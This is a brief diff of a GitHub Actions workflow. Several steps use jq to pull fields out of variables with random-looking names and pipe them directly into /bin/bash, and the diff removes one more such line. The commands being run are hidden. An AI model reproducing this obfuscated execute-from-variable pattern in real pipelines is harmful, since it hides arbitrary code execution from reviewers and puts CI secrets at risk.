@@ -24,7 +24,6 @@ jobs:
           echo $wald4366 | jq -r .gw5595 | /bin/bash
           printf '%s' "$f6" | jq -r .isg4905 | /bin/bash
           echo $vb9419 | jq -r .r79 | /bin/bash
-          echo $gyn661 | jq -r .sujjj12 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
